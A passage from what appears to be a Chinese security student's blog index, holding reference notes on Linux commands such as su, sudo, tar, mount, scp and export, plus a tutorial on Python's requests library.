外，需要键入该使用者的密码。使用权限：所有使用者。 语法： 1su [-fmp] [-c command] [-s shell] [--help] [--version] [-] [USER [ARG]] 参数说明： -f 或 --fast 不必读启动档（如 csh.cshrc 等），仅用于 csh 或 tcsh -m -p 或 --preserve-environment 执行 su 时不改变环境变数 -c command 或 --command=command 变更为帐号为 USER 的使用者并执行指令（command）后再变回原来使用者 -s shell 或 --shell=shell 指定要执行的 shell （bash csh tcsh 等），预设值为 /etc/passwd 内的该使用者（USER） shell –help 显示说明文件 –version 显示版本资讯 - -l 或 --login 这个参数加了之后，就好像是重新 login 为该使用者一样，大部份环境变数（HOME SHELL USER等等）都是以该使用者（USER）为主，并且工作目录也会改变，如果没有指定 USER ，内定是 root USER 欲变更的使用者帐号 ARG 传入新的 shell 参数 实例： 变更帐号为 root 并在执行 ls 指令后退出变回原使用者 1su -c ls root 变更帐号为 root 并传入 -f 参数给新执行的 shell 1su root -f 变更帐号为 clsung 并改变工作目录至 clsung 的家目录（home dir） 1su - clsung 切换用户 12345678910hnlinux@runoob.com:~$ whoami //显示当前用户hnlinuxhnlinux@runoob.com:~$ pwd //显示当前目录/home/hnlinuxhnlinux@runoob.com:~$ su root //切换到root用户密码： root@runoob.com:/home/hnlinux# whoami rootroot@runoob.com:/home/hnlinux# pwd/home/hnlinux 切换用户，改变环境变量 12345678910hnlinux@runoob.com:~$ whoami //显示当前用户hnlinuxhnlinux@runoob.com:~$ pwd //显示当前目录/home/hnlinuxhnlinux@runoob.com:~$ su - root //切换到root用户密码： root@runoob.com:/home/hnlinux# whoami rootroot@runoob.com:/home/hnlinux# pwd //显示当前目录/root 0x05 sudo 功能：以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。 使用权限：在 /etc/sudoers 中有出现的使用者。 语法 1sudo -V -V 显示版本编号 1sudo -h -h 会显示版本编号及指令的使用方式说明 1sudo -l -l 显示出自己（执行 sudo 的使用者）的权限 1sudo -v -v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码 1sudo -k -k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟） 1sudo -s -s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell 1sudo -H -H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ） 1sudo [ -b ] [ -p prompt ] [ -u username/#uid] -s -b 将要执行的指令放在背景执行 -p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称 -u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码） 1sudo command command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令 实例 sudo命令使用 123$ sudo ls[sudo] password for hnlinux: hnlinux is not in the sudoers file. This incident will be reported. 指定用户执行命令 1# sudo -u userb ls -l 显示sudo设置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576$ sudo -L //显示sudo设置Available options in a sudoers ``Defaults'' line:syslog: Syslog facility if syslog is being used for loggingsyslog_goodpri: Syslog priority to use when user authenticates successfullysyslog_badpri: Syslog priority to use when user authenticates unsuccessfullylong_otp_prompt: Put OTP prompt on its own lineignore_dot: Ignore '.' in $PATHmail_always: Always send mail when sudo is runmail_badpass: Send mail if user authentication failsmail_no_user: Send mail if the user is not in sudoersmail_no_host: Send mail if the user is not in sudoers for this hostmail_no_perms: Send mail if the user is not allowed to run a commandtty_tickets: Use a separate timestamp for each user/tty combolecture: Lecture user the first time they run sudolecture_file: File containing the sudo lectureauthenticate: Require users to authenticate by defaultroot_sudo: Root may run sudolog_host: Log the hostname in the (non-syslog) log filelog_year: Log the year in the (non-syslog) log fileshell_noargs: If sudo is invoked with no arguments, start a shellset_home: Set $HOME to the target user when starting a shell with -salways_set_home: Always set $HOME to the target user's home directorypath_info: Allow some information gathering to give useful error messagesfqdn: Require fully-qualified hostnames in the sudoers fileinsults: Insult the user when they enter an incorrect passwordrequiretty: Only allow the user to run sudo if they have a ttyenv_editor: Visudo will honor the EDITOR environment variablerootpw: Prompt for root's password, not the users'srunaspw: Prompt for the runas_default user's password, not the users'stargetpw: Prompt for the target user's password, not the users'suse_loginclass: Apply defaults in the target user's login class if there is oneset_logname: Set the LOGNAME and USER environment variablesstay_setuid: Only set the effective uid to the target user, not the real uidpreserve_groups: Don't initialize the group vector to that of the target userloglinelen: Length at which to wrap log file lines (0 for no wrap)timestamp_timeout: Authentication timestamp timeoutpasswd_timeout: Password prompt timeoutpasswd_tries: Number of tries to enter a passwordumask: Umask to use or 0777 to use user'slogfile: Path to log filemailerpath: Path to mail programmailerflags: Flags for mail programmailto: Address to send mail tomailfrom: Address to send mail frommailsub: Subject line for mail messagesbadpass_message: Incorrect password messagetimestampdir: Path to authentication timestamp dirtimestampowner: Owner of the authentication timestamp direxempt_group: Users in this group are exempt from password and PATH requirementspassprompt: Default password promptpassprompt_override: If set, passprompt will override system prompt in all cases.runas_default: Default user to run commands assecure_path: Value to override user's $PATH witheditor: Path to the editor for use by visudolistpw: When to require a password for 'list' pseudocommandverifypw: When to require a password for 'verify' pseudocommandnoexec: Preload the dummy exec functions contained in 'noexec_file'noexec_file: File containing dummy exec functionsignore_local_sudoers: If LDAP directory is up, do we ignore local sudoers fileclosefrom: File descriptors &gt;= %d will be closed before executing a commandclosefrom_override: If set, users may override the value of `closefrom' with the -C optionsetenv: Allow users to set arbitrary environment variablesenv_reset: Reset the environment to a default set of variablesenv_check: Environment variables to check for sanityenv_delete: Environment variables to removeenv_keep: Environment variables to preserverole: SELinux role to use in the new security contexttype: SELinux type to use in the new security contextaskpass: Path to the askpass helper programenv_file: Path to the sudo-specific environment filesudoers_locale: Locale to use while parsing sudoersvisiblepw: Allow sudo to prompt for a password even if it would be visisblepwfeedback: Provide visual feedback at the password prompt when there is user inputfast_glob: Use faster globbing that is less accurate but does not access the filesystemumask_override: The umask specified in sudoers will override the user's, even if it is more permissive 以root权限执行上一条命令 1$ sudo !! 以特定用户身份进行编辑文本 12$ sudo -u uggc vi ~www/index.html//以 uggc 用户身份编辑 home 目录下www目录中的 index.html 文件 列出目前的权限 1sudo -l 列出 sudo 的版本资讯 1sudo -V su和sudo的区别： su用于用户之间的切换。 sudo用于普通用户可以使用root权限来执行指定命令。 0x03 帮助命令 0x00 man（manual） 功能：查看命令的帮助 0x01 help 功能：查看命令的帮助 0x04 查找命令 0x00 whereis（whereis） 功能：查找命令的命令，同时看到帮助文档位置 实例： 12root@:/mnt/d/谷歌下载文件# whereis lsls: /bin/ls /usr/share/man/man1/ls.1.gz 0x01 find 功能：搜索命令，会在给定位置搜寻与条件匹配的文件 命令格式： 1find 查找位置 -name 文件名 相关选项： ▧ -name 文件名：按照文件名查找（区分大小写二） ▧ -iname 文件名：按照文件名查找，不区分大小写 ▧ -user 用户名：按照属主用户名查找文件 ▧ -group 组名 按照属组组名查找文件 ▧ -size 文件名：按照文件大小k M 如：find / -size +50k ▧ -type：按照文件类型查找(f=普通 d=目录 l=链接) 0x02 grep 功能：查找符合条件的字串 命令格式： 1grep 选项 &apos;字串&apos; 查找路径 比如：在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： 1grep test *file 相关选项： -i：忽略大小写 -v：反向选择 -A：除了显示符合范本样式的那一列之外，并显示该行之后的内容 相关知识：管道符 “|” 命令1 | 命令2：命令 1 的执行结果，作为命令 2 的执行条件 cat 文件名 | grep '字串'：提取含有字符串的行 ls -l /etc | more：分屏显示 ls 内容 0x05 压缩和解压缩 相关知识： ➤ linux可以识别的常见压缩格式：.gz .bz2 ➤ 常见的压缩和打包命令：.tar.gz .tar.bz2 0x00 tar（Tape archive，磁带档案） 功能：能创建、查看和提取tar压缩文件 命令格式： 1tar -zcvf 压缩文件名 源文件 // 压缩文件 相关选项： 创建压缩文件：tar -cvf 压缩文件名 源文件 ▧ -c：建立新的备份文件（压缩） 查看压缩文件：tar -tvf 压缩文件名 ▧ -t：列出备份文件的内容 提取对应压缩文件：tar -xvf 压缩文件名 ▧ -x：从备份文件中还原文件 通用选项 ▧ -v：显示指令执行过程 ▧ -f：指定压缩包名 多个文件/目录压缩：tar czvf my.tar.gz file1 file2,...（file*） 0x01 gzip 功能：命令创建和提取gzip压缩文件 相关选项： 压缩相关选项： 1、保留原始文件 如果要保留输入（原始）文件，请使用-k选项： $ gzip -k filename 保留原始文件的另一个选项是使用-c选项，它使gzip在标准输出上写入并将输出重定向到文件： $ gzip -c filename &gt; filename.gz 2、详细输出 如果要查看减少百分比和正在处理的文件的名称，请使用-v选项： $ gzip -v filename 返回数据： filename: 7.5% -- replaced with filename.gz 3、压缩多个文件 你还可以将多个文件作为参数传递给命令，例如，要压缩名为file1、file2、file3的文件，你将运行以下命令： $ gzip file1 file2 file3 上面的命令将创建三个压缩文件：file1.gz、file2.gz、file3.gz，要想将多个文件压缩至一个压缩包 $ gzip file1 file2 file3 &gt; file4.gz 4、压缩目录中的所有文件 要压缩给定目录中的所有文件，请使用-r选项： $ gzip -r directory gzip将递归遍历整个目录结构并压缩目录及其子目录中的所有文件。 解压相关选项： 1.要解压缩.gz文件，请使用-d选项： gzip -d：来提取压缩文件 但是不会保留压缩文件，要想保留压缩文件，用-k选项： $ gzip -dk filename.gz 要一次解压缩多个文件，请将文件名作为参数传递给gzip： $ gzip -d file1 file2 file3 当与-d和-r选项一起使用时，gzip以递归方式解压缩给定目录中的所有文件： $ gzip -dr directory 2.与-l选项一起使用时，gzip显示有关给定压缩文件的统计信息： gzip -l filename：列出压缩文件的相关信息 0x05 关机和重启命令 0x00 shutdown 功能：关机/重启 相关选项： shutdown -h now：立即关机 shutdown -r now：立即重启 shutdown -t [seconds]：设定在几秒钟之后进行关机程序 shutdown +5 “System will shutdown after 5 minutes”：5分钟够关机并显示警告信息 0x01 reboot 功能：关机/重启挂载（重新启动） 0x02 mount 相关知识点：光盘挂载 提一句Windows下，mount挂载，就是给磁盘分区提供一个盘符（C,D,E,…）。比如插入U盘后系统自动分配给了它I:盘符其实就是挂载，退优盘的时候进行安全弹出，其实就是卸载unmount。 Linux下，不像Windows可以有C,D,E,多个目录，Linux只有一个根目录/。在装系统时，我们分配给linux的所有区都在/下的某个位置，比如/home等等。 提问者插入了新硬盘，分了新磁盘区sdb1。它现在还不属于/。 我们虽然可以在一些图形桌面系统里找到他的位置，浏览管理里面的文件，但在命令行却不知怎么访问它的目录，比如无法使用cd或者ls。也无法在编程时指定一个目录对它操作。 这时提问者使用了 mount /dev/sdb1 ~/Share/ ，把新硬盘的区sdb1挂载到工作目录的/Share/文件夹下，之后访问这个/Share/文件夹就相当于访问这个硬盘2的sdb1分区了。对/Share/的任何操作，都相当于对sdb1里文件的操作。 所以Linux下，mount挂载的作用，就是**将一个设备（通常是存储设备）挂接到一个已存在的目录上。**访问这个目录就是访问该存储设备。 **linux操作系统将所有的设备都看作文件，它将整个计算机的资源都整合成一个大的文件目录。**我们要访问存储设备中的文件，必须将文件所在的分区挂载到一个已存在的目录上，然后通过访问这个目录来访问存储设备。挂载就是把设备放在一个目录下，让系统知道怎么管理这个设备里的文件，了解这个存储设备的可读写特性之类的过程。 我们不是有/dev/sdb1 吗，直接对它操作不就行了？这不是它的目录吗？ 这不是它的目录。虽然/dev是个目录，但/dev/sdb1不是目录。可以发现ls/dev/sdb1无法执行。/dev/sdb1，是一个类似指针的东西，指向这个分区的原始数据块。mount前，系统并不知道这个数据块哪部分数据代表文件，如何对它们操作。 插入CD，系统其实自动执行了 mount /dev/cdrom /media/cdrom。所以可以直接在/media/cdrom中对CD中的内容进行管理。 功能：是经常会使用到的命令，它用于挂载Linux系统外的文件 案例： 将 /dev/hda1 挂在 /mnt 之下： 1mount /dev/hda1 /mnt（空目录） 将 /dev/hda1 用唯读模式挂在 /mnt 之下： 1mount -o ro /dev/hda1 /mnt 将 /tmp/image.iso 这个光碟的 image 档使用 loop 模式挂在 /mnt/cdrom之下。用这种方法可以将一般网络上可以找到的 Linux 光 碟 ISO 档在不烧录成光碟的情况下检视其内容： 1#mount -o loop /tmp/image.iso /mnt/cdrom 光盘挂载 /dev/sda1 第一个scsi硬盘的第一分区 /dev/cdrom 光盘 /dev/hdc IDE硬盘 centos 5.5 /dev/sr0 光盘 centos 6.x mount -t 文件系统 设备描述文件 挂载点（已经存在空目录）mount -t iso9660 /dev/cdrom /mnt/cdrom 光盘卸载 umount /dev/cdrom umount /mnt/cdrom 注意：退出挂载目录，才能卸载 fdisk -l 查看设备名 mount -t vfat /dev/sdb1 /mnt/usb 0x06 网络命令 0x00 ping 功能：测试网络畅通性 命令格式：ping -c 次数 ip 0x01 ifconfig 功能：查询本机网络信息 0x02 scp 功能：在服务器上下载/上传文件 命令格式： 从服务器上下载文件 1# scp -P port username@servername:remote_dir/ /tmp/local_dir 往服务器上上传文件 1# scp -P port /path/filename username@servername:/path 从服务器下载整个目录 1# scp -r -P port username@servername:/var/www/remote_dir/（远程目录） /var/www/local_dir（本地目录） 给服务器上传整个目录 1# scp -r -P port local_dir username@servername:remote_dir 实例：从pwnable.kr上面下载文件 1scp -P 2222 fd@pwnable.kr:/home/fd/fd.c /home/mask/ 0x03 其他命令 其他相关命令见我转载的一篇博客：Linux 常用网络命令介绍 0x07 Linux系统指令 0x00 Linux 环境变量的设置 export 功能：设置或显示环境变量。 格式：export [-fnp][变量名称]=[变量设置值] 参数说明： -f：代表[变量名称]中为函数名称。 -n：删除指定的变量。变量实际上并未删除，只是不会输出到后续指令的执行环境中。 -p：列出所有的shell赋予程序的环境变量。 设置临时环境变量 功能：修改PATH的值，配置MySQL进入环境变量的方法: 形式： 12345&gt; export PATH=/home/uusama/mysql/bin:$PATH&gt; &gt; # 或者把PATH放在前面&gt; export PATH=$PATH:/home/uusama/mysql/bin&gt; 注意事项 生效时间：立即生效 生效期限：当前终端有效，窗口关闭后无效 生效范围：仅对当前用户有效 配置的环境变量中不要忘了加上原来的配置，即$PATH部分，避免覆盖原来配置 export设置环境变量是暂时的，只在本次登录中有效，可修改如下文件来使命令长久有效 设置永久环境变量 1.profile文件（/etc/profile） 用于设置系统级的环境变量和启动程序，在这个文件下配置会对所有用户生效。当用户登录（login）时，文件会被执行，并从/etc/profile.d目录的配置文件中查找shell设置。在profile中添加环境变量。一般不建议在/etc/profile文件中添加环境变量，因为在这个文件中添加的设置会对所有用户起作用。当需要添加时，我们可以按以方式添加：如，添加一个HOST值为itbilu.com的环境变量： 12&gt; export HOST=itbilu.com&gt; 添加时，可以在行尾使用;号，也可以不使用。一个变量名可以对应多个变量值，多个变量值使用:分隔。添加环境变量后，需要重新登录才能生效，也可以使用source命令强制立即生效： 12&gt; source /etc/profile&gt; 查看是否生效可以使用echo命令： 123&gt; $ echo $HOST&gt; itbilu.com&gt; bashrc文件 这个文件用于配置函数或别名。bashrc文件有两种级别：系统级的位于/etc/bashrc、用户级的~/.bashrc，两者分别会对所有用户和当前用户生效。bashrc文件只会对指定的shell类型起作用，bashrc只会被bash shell调用。 bash_profile文件 bash_profile只有单一用户有效，文件存储位于~/.bash_profile，该文件是一个用户级的设置，可以理解为某一个用户的profile目录下。这个文件同样也可以用于配置环境变量和启动程序，但只针对单个用户有效。和profile文件类似，bash_profile也会在用户登录（login）时生效，也可以用于设置环境变理。但与profile不同，bash_profile只会对当前用户生效。 详解请查看该链接 0x01 ps 功能：用于显示当前进程 (process) 的状态 语法：ps [options] [–help] 参数：ps 的参数非常多, 在此仅列出几个常用的参数并大略介绍含义 -A 列出所有的行程 -w 显示加宽可以显示较多的资讯 -au 显示较详细的资讯 -aux 显示所有包含其他使用者的行程 au(x) 输出格式 : USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND USER: 行程拥有者 PID: pid %CPU: 占用的 CPU 使用率 %MEM: 占用的记忆体使用率 VSZ: 占用的虚拟记忆体大小 RSS: 占用的记忆体大小 TTY: 终端的次要装置号码 (minor device number of tty) STAT: 该行程的状态: D: 无法中断的休眠状态 (通常 IO 的进程) R: 正在执行中 S: 静止状态 T: 暂停执行 Z: 不存在但暂时无法消除 W: 没有足够的记忆体分页可分配 &lt;: 高优先序的行程 N: 低优先序的行程 L: 有记忆体分页分配并锁在记忆体内 (实时系统或捱A I/O) START: 行程开始时间 TIME: 执行的时间 COMMAND:所执行的指令 0x02 dpkg 功能：Debian Linux系统用来安装、创建和管理软件包的实用工具。 语法：dpkg(选项)(参数) 参数 -i：安装软件包； -r：删除软件包； -P：删除软件包的同时删除其配置文件； -L：显示于软件包关联的文件； -l：显示已安装软件包列表； –unpack：解开软件包； -c：显示软件包内文件列表； –confiugre：配置软件包。 0x08 Linux通配符 0x00 $符号的作用]]></content>
      <tags>
        <tag>基础知识</tag>
        <tag>知识库</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编程语言的发展历史 from1954to2019]]></title>
    <url>%2F2020%2F03%2F18%2F2020.03.17%EF%BC%88103%EF%BC%89%2F</url>
    <content type="text"><![CDATA[转载：Computer Languages History]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[知识库构建初想]]></title>
    <url>%2F2020%2F03%2F16%2F2020.03.16%EF%BC%88102%EF%BC%89%2F</url>
    <content type="text"><![CDATA[随着安全学习的不断深入，发现做笔记以及积累的重要性，这段时间在我脑海里一直有个想法出现，那就是做专题知识点总结，包括web、二进制、密码学 WEB]]></content>
      <tags>
        <tag>知识库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python基本第三方库总结（0x00）：requests库（Python中唯一的非转基因库）]]></title>
    <url>%2F2020%2F03%2F15%2F2020.03.15%EF%BC%88101%EF%BC%89%2F</url>
    <content type="text"><![CDATA[首先来看一下基本第三方库有什么？ 库名 作用 Requests Kenneth Reitz写的最富盛名的http库。每个Python程序员都应该有它 Scrapy 爬虫相关的工作 Re Python 中的正则表达式，与Requests库结合用 wxPython Python的一个GUI（图形用户界面）工具，替代tkinter Pillow 是PIL（Python图形库）的一个友好分支。对于用户比PIL更加友好，对于任何在图形领域工作的人是必备的库 SQLAlchemy 一个数据库的库 BeautifulSoup 这个xml和html的解析库对于新手非常有用 Twisted 对于网络应用开发者最重要的工具。它有非常优美的api，被很多Python开发大牛使用 NumPy 它为Python提供了很多高级的数学方法 SciPy 是一个Python的算法和数学工具库，它的功能把很多科学家从Ruby吸引到了Python matplotlib 一个绘制数据图的库。对于数据科学家或分析师非常有用 Pygame 哪个程序员不喜欢玩游戏和写游戏？这个库会让你在开发2D游戏的时候如虎添翼 Pyglet D动画和游戏开发引擎。非常有名的Python版本Minecraft就是用这个引擎做的 pyQT Python的GUI工具。这是我在给Python脚本开发用户界面时次于wxPython的选择 pyGtk 也是Python GUI库。很有名的Bittorrent客户端就是用它做的 Scapy 用Python写的数据包探测和分析库 pywin32 一个提供和windows交互的方法和类的Python库 nltk 自然语言工具包。我知道大多数人不会用它，但它通用性非常高。如果你需要处理字符串的话，它是非常好的库。但它的功能远远不止如此，自己摸索一下吧 nose Python的测试框架。被成千上万的Python程序员使用 SymPy SymPy可以做代数评测、差异化、扩展、复数等等。它封装在一个纯Python发行版本里。 IPython 怎么称赞这个工具的功能都不为过。它把Python的提示信息做到了极致。包括完成信息、历史信息、shell功能，以及其他很多很多方面。一定要研究一下它。 hashlib base64 os 在入手阶段，先挑几个重点库（字体加粗的）进行学习和总结：Requests、base64、hashlib、Re、BeautifulSoup、Pillow、os、Pygame、Scrapy、IPython 1.Requests 库的基本用法首先来见识一下 Requests 库的威力： 1234567891011&gt;&gt;&gt; r = requests.get("https://api.github.com/user", auth=('user', 'pass'))&gt;&gt;&gt; r.status_code200&gt;&gt;&gt; r.headers["content-type"] 'application/json; charset=utf8'&gt;&gt;&gt; r.encoding"utf-8"&gt;&gt;&gt; r.textu'&#123;"type":"User"...'&gt;&gt;&gt; r.json()&#123;u'private_gists': 419, u'total_private_repos': 77, ...&#125; 1.1 功能特性 Keep-Alive &amp; 连接池 国际化域名和 URL 带持久 Cookie 的会话 浏览器式的 SSL 认证 自动内容解码 基本/摘要式的身份认证 优雅的 key/value Cookie 自动解压 Unicode 响应体 HTTP(S) 代理支持 文件分块上传 流下载 连接超时 分块请求 支持 .netrc 1.2 两个主要请求方法GET 一般的请求方式 1r = requests.get(URL) 带有参数的请求方式 1234 payload = &#123;'key1': 'value1', 'key2': ['value2', 'value3'],"key3":"none"&#125; //注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。r = requests.get(URL, params=payload) // 第一种方式##############################################################r = requests.get(URL, params=&#123;"key1":"value1","key2":"value2"&#125;) 带有请求头其他参数的方式 1r = requests.get(URL, headers=&#123;'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit'&#125;) POST 一般的请求方式 1r = requests.post(URL) 带有参数的请求方式 123456789101112131415r = requests.post("URL",data = &#123;'key':'value'&#125;) # 注意，如果POST请求需要传递json对象，需要使用json库的dumps()函数做一步转换#########################################################################################&gt;&gt;&gt; url = 'https://api.github.com/some/endpoint'&gt;&gt;&gt; payload = &#123;'some': 'data'&#125;&gt;&gt;&gt; r = requests.post(url, data=json.dumps(payload))# 此处除了可以自行对 dict 进行编码，你还可以使用 json 参数直接传递，然后它就会被自动编码。这是 2.4.2 版的新加功能：&gt;&gt;&gt; url = 'https://api.github.com/some/endpoint'&gt;&gt;&gt; payload = &#123;'some': 'data'&#125;&gt;&gt;&gt; r = requests.post(url, json=payload) 带有请求头其他参数的方式同 GET 的方式一样 1.3 响应内容requests 响应的属性 属性 信息 说明 r.url HTTP 请求的网址 r.headers 获得头部信息 r.text HTTP响应内容的字符串形式，即：url对应的页面内容 r.content HTTP响应内容的二进制形式 r.status_code HTTP请求的返回状态（状态码） r.cookies 网站的cookies r.encoding 从HTTP header中猜测的响应内容编码方式 能够更改 r.apparent_encoding 从内容中分析出的响应内容编码方式（备选编码方式） 如果你改变了编码，每当你访问 r.text ，Request 都将会使用 r.encoding 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 r.content 来找到编码，然后设置 r.encoding 为相应的编码。这样就能使用正确的编码解析 r.text 了。 在你需要的情况下，Requests 也可以使用定制的编码。如果你创建了自己的编码，并使用 codecs 模块进行注册，你就可以轻松地使用这个解码器名称作为 r.encoding 的值， 然后由 Requests 来为你处理编码。 二进制响应内容 12&gt;&gt;&gt; r.contentb'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/... Requests 会自动为你解码 gzip 和 deflate 传输编码的响应数据，例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码： 123&gt;&gt;&gt; from PIL import Image&gt;&gt;&gt; from io import BytesIO&gt;&gt;&gt; i = Image.open(BytesIO(r.content)) Json 响应内容 Requests 中也有一个内置的 JSON 解码器，助你处理 JSON 数据： 1234&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get("https://api.github.com/events")&gt;&gt;&gt; r.json()[&#123;u'repository': &#123;u'open_issues': 0, u'url': 'https://github.com/... 如果 JSON 解码失败， r.json() 就会抛出一个异常。例如，响应内容是 401 (Unauthorized)，尝试访问 r.json() 将会抛出 ValueError: No JSON object could be decoded 异常。 需要注意的是，成功调用 r.json() 并不意味着响应的成功。有的服务器会在失败的响应中包含一个 JSON 对象（比如 HTTP 500 的错误细节）。这种 JSON 会被解码返回。要检查请求是否成功，请使用 r.raise_for_status() 或者检查 r.status_code 是否和你的期望相同。 1.4 响应状态码 我们可以检测状态码： 123&gt;&gt;&gt; r = requests.get('http://httpbin.org/get')&gt;&gt;&gt; r.status_code200 为方便引用，Requests还附带了一个内置的状态码查询对象： 12&gt;&gt;&gt; r.status_code == requests.codes.okTrue 如果发送了一个错误请求(一个 4XX 客户端错误，或者 5XX 服务器错误响应)，我们可以通过 Response.raise_for_status() 来抛出异常： 12345678&gt;&gt;&gt; bad_r.status_code404&gt;&gt;&gt; bad_r.raise_for_status()Traceback (most recent call last): File "requests/models.py", line 832, in raise_for_status raise http_errorrequests.exceptions.HTTPError: 404 Client Error 1.4 Cookie如果某个响应中包含一些 cookie，你可以快速访问它们： 12345&gt;&gt;&gt; url = 'http://example.com/some/cookie/setting/url'&gt;&gt;&gt; r = requests.get(url)&gt;&gt;&gt; r.cookies['example_cookie_name']'example_cookie_value' 要想发送你的cookies到服务器，可以使用 cookies 参数： 12345&gt;&gt;&gt; cookies = dict(cookies_are='working')&gt;&gt;&gt; r = requests.get(url, cookies=cookies)&gt;&gt;&gt; r.text'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;' 1.5 重定向与请求历史默认情况下，除了 HEAD, Requests 会自动处理所有重定向。 可以使用响应对象的 history 方法来追踪重定向。 Response.history 是一个 Response 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。 例如，Github 将所有的 HTTP 请求重定向到 HTTPS： 12345678910&gt;&gt;&gt; r = requests.get('http://github.com')&gt;&gt;&gt; r.url'https://github.com/'&gt;&gt;&gt; r.status_code200&gt;&gt;&gt; r.history[&lt;Response [301]&gt;] 1.6 超时可以告诉 requests 在经过以 timeout 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应： 1234&gt;&gt;&gt; requests.get('http://github.com', timeout=0.001)Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;requests.exceptions.Timeout: HTTPConnectionPool(host='github.com', port=80): Request timed out. (timeout=0.001) 注意：timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out. 2 requests 库的高级用法2.1 会话对象Session会话对象让你能够跨请求保持某些参数。它也会在同一个 Session 实例发出的所有请求之间保持 cookie， 期间使用 urllib3 的 connection pooling 功能。所以如果你向同一主机发送多个请求，底层的 TCP 连接将会被重用，从而带来显著的性能提升。 (参见 HTTP persistent connection). 会话对象具有主要的 Requests API 的所有方法。我们来跨请求保持一些 cookie: 1234567s = requests.Session()s.get('http://httpbin.org/cookies/set/sessioncookie/123456789')r = s.get("http://httpbin.org/cookies")print(r.text)# '&#123;"cookies": &#123;"sessioncookie": "123456789"&#125;&#125;' 2.2 请求与响应对象任何时候进行了类似 requests.get() 的调用，你都在做两件主要的事情。其一，你在构建一个 Request 对象， 该对象将被发送到某个服务器请求或查询一些资源。其二，一旦 requests 得到一个从服务器返回的响应就会产生一个 Response 对象。该响应对象包含服务器返回的所有信息，也包含你原来创建的 Request 对象。如下是一个简单的请求，从 Wikipedia 的服务器得到一些非常重要的信息： 1&gt;&gt;&gt; r = requests.get('http://en.wikipedia.org/wiki/Monty_Python') 如果想访问服务器返回给我们的响应头部信息，可以这样做： 123456789&gt;&gt;&gt; r.headers&#123;'content-length': '56170', 'x-content-type-options': 'nosniff', 'x-cache':'HIT from cp1006.eqiad.wmnet, MISS from cp1010.eqiad.wmnet', 'content-encoding':'gzip', 'age': '3080', 'content-language': 'en', 'vary': 'Accept-Encoding,Cookie','server': 'Apache', 'last-modified': 'Wed, 13 Jun 2012 01:33:50 GMT','connection': 'close', 'cache-control': 'private, s-maxage=0, max-age=0,must-revalidate', 'date': 'Thu, 14 Jun 2012 12:59:39 GMT', 'content-type':'text/html; charset=UTF-8', 'x-cache-lookup': 'HIT from cp1006.eqiad.wmnet:3128,MISS from cp1010.eqiad.wmnet:80'&#125; 然而，如果想得到发送到服务器的请求的头部，我们可以简单地访问该请求，然后是该请求的头部： 123&gt;&gt;&gt; r.request.headers&#123;'Accept-Encoding': 'identity, deflate, compress, gzip','Accept': '*/*', 'User-Agent': 'python-requests/0.13.1'&#125; 2.3 准备的请求 （Prepared Request）目前忽略 2.4 SSL 证书验证Requests 可以为 HTTPS 请求验证 SSL 证书，就像 web 浏览器一样。SSL 验证默认是开启的，如果证书验证失败，Requests 会抛出 SSLError: 12&gt;&gt;&gt; requests.get('https://requestb.in')requests.exceptions.SSLError: hostname 'requestb.in' doesn't match either of '*.herokuapp.com', 'herokuapp.com' 在该域名上我没有设置 SSL，所以失败了。但 Github 设置了 SSL: 12&gt;&gt;&gt; requests.get('https://github.com', verify=True)&lt;Response [200]&gt; 你可以为 verify 传入 CA_BUNDLE 文件的路径，或者包含可信任 CA 证书文件的文件夹路径： 1&gt;&gt;&gt; requests.get('https://github.com', verify='/path/to/certfile') 或者将其保持在会话中： 12s = requests.Session()s.verify = '/path/to/certfile' 注解：如果 verify 设为文件夹路径，文件夹必须通过 OpenSSL 提供的 c_rehash 工具处理 你还可以通过 REQUESTS_CA_BUNDLE 环境变量定义可信任 CA 列表。 如果你将 verify 设置为 False，Requests 也能忽略对 SSL 证书的验证。 12&gt;&gt;&gt; requests.get('https://kennethreitz.org', verify=False)&lt;Response [200]&gt; # 对于私有证书，你也可以传递一个 CA_BUNDLE 文件的路径给 verify。你也可以设置 # REQUEST_CA_BUNDLE 环境变量。 其他相关requests内容请见Requests库中文官方文档]]></content>
      <tags>
        <tag>python</tag>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss_payload_构造总结及深度剖析(持续更新中……)]]></title>
    <url>%2F2020%2F03%2F09%2F2020.03.08%EF%BC%88100%EF%BC%89%2F</url>
